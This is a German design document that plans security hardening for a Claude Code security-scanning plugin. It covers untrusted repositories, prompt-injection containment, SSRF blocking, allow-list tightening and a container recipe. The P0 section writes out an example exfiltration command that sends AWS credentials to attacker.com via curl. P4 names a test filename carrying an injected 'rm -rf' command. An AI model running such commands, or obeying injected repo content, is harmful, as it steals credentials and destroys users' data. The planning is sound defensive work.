# Security-Hardening-Plan: Untrusted-Repo-Defaults und Prompt-Injection-Containment

**Status:** Vorschlag, nicht umgesetzt
**Erstellt:** 2026-05-13
**Bezug:** `SECURITY.md` § "Known issues — untrusted repositories" (Zeilen 81–113)
**Verwandt:** `docs/refactoring-plan.md` (M10 ersetzt `eval()`, orthogonal zu diesem Plan)
**Leitprinzip:** Containment-First. Prompt-Injection ist Stand der Technik nicht zuverlässig zu *verhindern* — nur in den Folgen zu *begrenzen*. Maßnahmen werden danach priorisiert, wie viel sie an Folgen-Reduktion bringen, nicht wie viel sie an Detection versprechen.

---

## Verifikations-Ergebnisse (gegen HEAD)

Drei Behauptungen aus der vorangegangenen Analyse mussten korrigiert werden:

1. **`Bash(*)` ist NICHT der aktuelle Zustand.** `.claude/settings.json:3-37` zeigt eine kuratierte Allow-List mit ~30 Commands. `SECURITY.md:87`, `SECURITY.md:109` und `README.md:48` sind **Dokumentations-Drift** und überzeichnen das aktuelle Risiko. Verbleibendes Risiko: der kuratierte Set enthält weiterhin `curl`, `rm`, `chmod`, `python3`, `awk`, `sed` — also weiterhin ein RCE-Primitive bei Prompt-Injection, aber kein unconstrained Shell-Escape.
2. **Subprocess-Aufrufe sind shell-injection-sicher.** Audit über alle `scripts/*.py`: 33 `subprocess.run`-Aufrufe, **kein einziges `shell=True`**, alle nutzen Listen-Form. Argument-Injection durch Filenames bleibt das verbleibende Restrisiko, nicht Shell-Escape.
3. **Recon-Scanner Cat 28 ist breiter als von `SECURITY.md` angedeutet.** `agents/appsec-recon-scanner.md:371-482` deckt nicht nur `.claude/settings.json`, sondern auch 28b (`Bash(*)`-Patterns), 28g (Symlink-`settings.json` auf `/dev/null`), Hook-Definitions und MCP-Configs ab. Die strukturelle Limitation bleibt: Detection läuft *nach* Hook-Execution durch Claude Code.

**Verifiziert wie behauptet:**

- `scripts/load_related_repos.py:146-166` nutzt `urllib.request.urlopen` ohne Redirect-Override → folgt Redirects per Default. URL-Scheme-Allowlist (http/https) existiert; IP-/Host-Allowlist nicht. `RELATED_REPOS_AUTH_HEADER` + per-entry `auth_env` werden ohne Host-Bindung gesetzt.
- `scripts/dep_scan.py:245-260, 379, 392, 407` invokiert `npm audit`, `pip-audit`, `govulncheck` auf attacker-kontrollierten Manifests.
- **Kein Dockerfile / kein Container-Setup** im Repo.
- `eval()` in `compose_threat_model.py:363` und `qa_checks.py:1114` — bereits im Refactor-Plan als M10 adressiert, nicht in diesem Plan.

---

## Plan-Übersicht

| Reihenfolge | Item | Aufwand | Wert | Begründung |
|---|---|---|---|---|
| 1 | P0 (Doku-Drift) | 0,5 h | Hoch | Falsche Risiko-Einschätzung blockiert alles andere intellektuell |
| 2 | P3 (Container) | 1,5 d | **Sehr hoch** | Einzige Maßnahme mit echter Wirkung gegen Prompt-Injection |
| 3 | P1 (load_related_repos Härtung) | 0,5 d | Mittel | Saubere Quick-Wins, niedriges Risiko |
| 4 | P2 (Pre-Flight) | 1 d | Niedrig–Mittel | Strukturell limitiert, aber besser als nichts |
| 5 | P4 (dep_scan Args) | 0,5 d | Niedrig | Restrisiko ohne bekannten Exploit |
| 6 | P5 (`--untrusted-repo`) | später | Hoch | Erst nach P3-Stabilisierung sinnvoll |

**Gesamt P0–P4: ~4 Personentage**, fünf separate PRs, alle bis auf P3↔P5 unabhängig parallelisierbar.

---

## P0 — Dokumentations-Drift beheben

**Aufwand:** 0,5 h
**Risiko:** Keins

**Was:** `SECURITY.md:87`, `SECURITY.md:109`, `README.md:48` von `Bash(*)` auf den realen kuratierten Allow-List-Stand umschreiben. Threat-Tabelle in `SECURITY.md` anpassen: Issue #1 muss formulieren, dass die Allow-List `curl`, `rm`, `chmod`, `python3`, `awk`, `sed` enthält — also weiterhin ein RCE-Primitive (`curl attacker.com -d "$(cat ~/.aws/...)"`), aber **nicht** „unconstrained shell".

**Verifikation:** `grep -rn 'Bash(\*)' SECURITY.md README.md` → leer, oder nur als Beispiel-für-zu-vermeidende-Konfiguration markiert.

**Warum zuerst:** Falsche Doku führt zu falscher Risiko-Einschätzung bei AppSec-Reviewern. Alle nachfolgenden Maßnahmen werden auf Basis korrekter Behauptungen verkauft.

---

## P1 — Sofortmaßnahmen in `load_related_repos.py`

**Aufwand:** 0,5 d

### P1.1 — IMDS/Link-Local/RFC1918-Blackhole

**Was:** Neue Funktion `_check_target_host(url)`, aufgerufen vor `urlopen`:

- DNS-Auflösung der Hostname-Komponente
- Reject wenn aufgelöste IP in: `127.0.0.0/8`, `169.254.0.0/16`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `::1/128`, `fe80::/10`, `fc00::/7`
- Resolve TOCTOU: gleiche IP an `urlopen` weitergeben (über Custom-Resolver oder Re-Check nach Connect)
- Opt-Out per Env-Var `RELATED_REPOS_ALLOW_PRIVATE_NETWORKS=1` für Enterprise mit internem Confluence

**Wo:** `scripts/load_related_repos.py:146-166` (`_fetch_url`)

**Risiko:** Bricht legitime Enterprise-Setups mit internem Threat-Model-Server auf RFC1918. Opt-Out-Var entschärft das. Bricht `localhost`-basierte Tests in CI — `tests/` muss Opt-Out setzen.

**Verifikation:** Neuer Test `tests/test_load_related_repos_ssrf.py` mit Cases `169.254.169.254`, `127.0.0.1`, `10.0.0.1`, plus Opt-Out-Verhalten.

### P1.2 — HTTP-Redirects deaktivieren

**Was:** Custom `HTTPRedirectHandler`-Subclass, die `redirect_request` auf `None` setzt → `HTTPError` bei jedem 3xx. Build über `urllib.request.build_opener(NoRedirectHandler).open(req)`.

**Wo:** `scripts/load_related_repos.py:146-166`

**Risiko:** Bricht GitHub-Repo-Umbenennungen, HTTP→HTTPS-Upgrades. Error-Message muss explizit sagen „target redirects to X — update `docs/related-repos.yaml`".

**Verifikation:** Test mit einem Mock-Server, der 301 zurückgibt → Fetch-Status muss `"unavailable: redirect to X"` sein.

### P1.3 — Allow-List-Review in `.claude/settings.json`

**Was:** Kritische Durchsicht der 30 erlaubten Bash-Commands. Kandidaten zum Entfernen oder Einschränken:

- `Bash(curl:*)` → `Bash(curl:* --max-time *)` oder ganz raus (Plugin nutzt Python-HTTP, nicht curl)
- `Bash(rm:*)` → einschränken auf bekannte Pfade (`docs/security/`, `/tmp/`)
- `Bash(chmod:*)` → nötig? Belegen oder entfernen
- `Bash(python3:*)` → bleibt nötig für `scripts/*.py`, aber `Bash(python3:scripts/*)` wäre enger
- `Bash(sed:*)`, `Bash(awk:*)` → von Agents tatsächlich genutzt? Inventar via `grep -r 'Bash(sed\|Bash(awk' agents/`

**Wo:** `.claude/settings.json`

**Risiko:** Mittelschwer. Zu enger Allow-List bricht Phase-Group-Skripte. Bevor entfernt, **Inventarisierung** der tatsächlichen Aufrufe in `agents/**/*.md`.

**Verifikation:** Full-Run auf OWASP Juice Shop mit der neuen Liste — kein Permission-Prompt.

**Vorbedingung:** ~3 h Inventarisierungs-Spike vor der eigentlichen Anpassung.

---

## P2 — Pre-Flight-Wrapper für `.claude/`-Hooks

**Aufwand:** 1 d
**Risiko:** Mittel (strukturelle Limitation)

**Was:** Neues Skript `scripts/preflight_repo_safety.py`, das **vor** dem `claude`-Aufruf läuft. Prüft:

- Target-Repo enthält `.claude/settings.json`, `.claude/settings.local.json`, `.claude/hooks.json`, `.claude/hooks/`
- Symlinks unter Target-Repo, die außerhalb des Repo-Roots zeigen (via `os.readlink` + `path.resolve()`-Vergleich)
- Übergroße Manifests (`package.json` >1 MB, etc.)

Modi:

- `--mode warn` (Default): Liste auf stderr, weiterlaufen
- `--mode reject`: Exit 2 bei Fund, blockiert Plugin-Start
- `--mode allow-list`: nur reject, wenn Datei nicht in user-konfigurierter Whitelist

Integration: Im Plugin-Entry-Point (Slash-Command oder README-Empfehlung) als ersten Schritt aufrufen. **Nicht** als Recon-Phase, weil zu spät — Claude Code hätte die Hooks dann schon geladen.

**Wo:** Neue Datei `scripts/preflight_repo_safety.py`, Doku-Erwähnung in `README.md`, optional Hook in `.claude/settings.json` für Dogfooding.

**Risiko:** Die strukturelle Schwäche („Hooks laden vor Plugin") bleibt — der Wrapper hilft nur, wenn Nutzer ihn vor `claude` ausführen. Default `warn` macht ihn als Sicherheitsmaßnahme schwach; Default `reject` bricht alle Repos mit legitimer Claude-Code-Tooling.

**Verifikation:** Tests gegen Fixture-Repos mit/ohne `.claude/settings.json`, mit Symlinks rein und raus.

---

## P3 — Container-Rezept dokumentieren und shippen

**Aufwand:** 1,5 d
**Risiko:** Niedrig technisch, mittel sozial
**Wert:** Sehr hoch — einzige Maßnahme mit echter Wirkung gegen Prompt-Injection-Folgen

**Was:** Drei Artefakte:

1. **`Dockerfile.scan`** im Repo-Root:
   - Base: `python:3.12-slim`
   - Plugin-Skripte + `requirements.txt` installiert
   - Non-root user
   - Read-only Bind-Mount für Target-Repo
   - Read-write Bind-Mount nur für Output-Dir (`docs/security/`)
   - Keine Credentials, kein SSH-Agent-Mount

2. **`docs/scan-in-container.md`**:
   - Beispiel-Command (`docker run --rm --network=plugin-net -v ...`)
   - Network-Policy-Anleitung: nur `api.anthropic.com` erreichbar
   - Wie Anthropic-API-Key sicher reinkommt (`--env-file` vs. Bind-Mount)
   - Wie Output extrahiert wird

3. **`scripts/scan_in_container.sh`** (optional, ggf. P3.5):
   - Thin Wrapper, der den Container startet
   - Validiert Target-Repo-Pfad (no symlinks out)
   - Setzt Network-Policy

**Wo:** Neue Dateien. Existierende `SECURITY.md:96-100` darauf verweisen, statt nur „Run in container" zu empfehlen.

**Risiko:** Nutzer ohne Docker-Erfahrung scheitern an Network-Policy. Anthropic-API-Key-Handling im Container ist Footgun (env in `docker inspect` sichtbar).

**Verifikation:**

- Manual: Scan in Container gegen OWASP Juice Shop, vergleichen mit Host-Run-Output (sollte identisch sein)
- Network-Test: `docker exec` mit `curl example.com` muss fehlschlagen, `curl api.anthropic.com` muss succeeden
- Egress-Audit: `tcpdump` auf Host-Side während Scan, alle Outbound-Verbindungen müssen `api.anthropic.com` sein

**Warum P3 vor P1/P2/P4:** Das ist die einzige Maßnahme, die Prompt-Injection-Folgen **wirksam** begrenzt. Ohne sie ist alles andere kosmetisch.

---

## P4 — Argument-Injection-Härtung in `dep_scan.py`

**Aufwand:** 0,5 d
**Risiko:** Niedrig (kein bekannter Exploit, vorsorgliche Härtung)

**Was:** Audit der `_run_tool`-Aufrufe in `dep_scan.py:379, 392, 407` — Manifests stehen in `cwd=manifest.parent`, Tool-Args sind statisch. Vektor wäre, wenn `manifest.parent` Sonderzeichen enthält oder wenn `manifest.name` (für Output-Tagging) in spätere Calls fließt.

Konkret:

- `cwd`-Pfad validieren: muss unter Target-Repo-Root liegen, keine `..`-Components nach `resolve()`
- Manifest-Filename-Validierung: nur `[A-Za-z0-9._-]+`, keine Leerzeichen/Quotes
- Bei zukünftigen Tool-Erweiterungen `--` als Separator zwischen Optionen und Positionals erzwingen

**Wo:** `scripts/dep_scan.py`, plus generisches Helper in einem neuen `scripts/_subprocess_safe.py`, das andere Skripte adoptieren können.

**Verifikation:** Test mit Fixture-Repo, das ein File namens `pkg; rm -rf /.json` enthält — muss reject oder safely-quote.

---

## P5 — `--untrusted-repo` als Opt-In Flag

**Aufwand:** 4–6 d
**Status:** Bewusst nicht für 0.11. Eigenes Epic, das nach P0–P4 evaluiert wird.

Inhalt entspricht `SECURITY.md:102-111` minus dem, was P1–P4 bereits abdecken:

- Volle Host-Allowlist (statt nur Private-Network-Block)
- Strikte Bash-Allow-List für den Run (separat vom Default, enger als P1.3)
- Container-Pflicht via P3-Wrapper (reject wenn nicht im Container detektiert — z.B. via `/.dockerenv` oder Env-Marker)
- Symlink-Reject statt Symlink-Warn

**Vorbedingung:** P3 muss stabil sein, sonst hat „Container-Pflicht" keinen funktionierenden Default-Pfad.

---

## Bewusst NICHT im Plan

- **Prompt-Injection-Prävention** (Detection per Regex/Heuristik): Stand der Technik ist „nicht zuverlässig". Containment via P3 ist die ehrliche Antwort.
- **`Read`-Tool-Interception für Symlink-Containment**: Das `Read`-Tool ist Claude-Code-intern, nicht Plugin-Layer. Symlink-Schutz für agent-getriebene Reads ginge nur über Pre-Flight (P2) oder Container-Read-Only-Mount mit `nosymfollow` (P3).
- **Argument-Injection-Härtung in `git`-Wrappern**: Existierende `subprocess.run`-Aufrufe in `baseline_state.py`, `publish_threat_model.py` etc. nehmen git-Refs entgegen. Audit könnte ergeben, dass das nötig ist — ist aber sekundär. Für 0.11 als „watch item" parken, mit konkreten Repro-Versuchen entscheiden.
- **Removing `eval()`**: Bereits im Refactor-Plan als M10 adressiert. Nicht duplizieren.

---

## Offene Fragen vor Umsetzung

1. **P3 Container-Egress-Policy**: Erwarten wir, dass Nutzer Network-Namespaces selbst aufsetzen, oder shippen wir einen `docker-compose.yml` mit Network-Definition? Letzteres ist bequemer, erstes auditbarer.
2. **P1.3 Allow-List-Tightening**: Brechen wir lieber selten genutzte Phase-Group-Skripte (engerer Allow-List) oder akzeptieren wir das Restrisiko (breitere Allow-List)? Inventarisierung der Bash-Aufrufe in `agents/**/*.md` würde das beantworten — könnte vor P1.3 als 1–2 h Spike vorgezogen werden.
3. **P2 Default-Modus**: `warn` oder `reject`? Empfehlung: `warn` als Default, `reject` als CI-Pflicht-Setting via Env-Var. Aber das ist diskutierbar.
4. **Versions-Strategie**: P0+P1 in 0.10.x als Patch shippen (sicher rückwärtskompatibel)? P2+P3 erst in 0.11 (eingeführte CLI-Wrapper)? Das spiegelt die Friction-Asymmetrie.
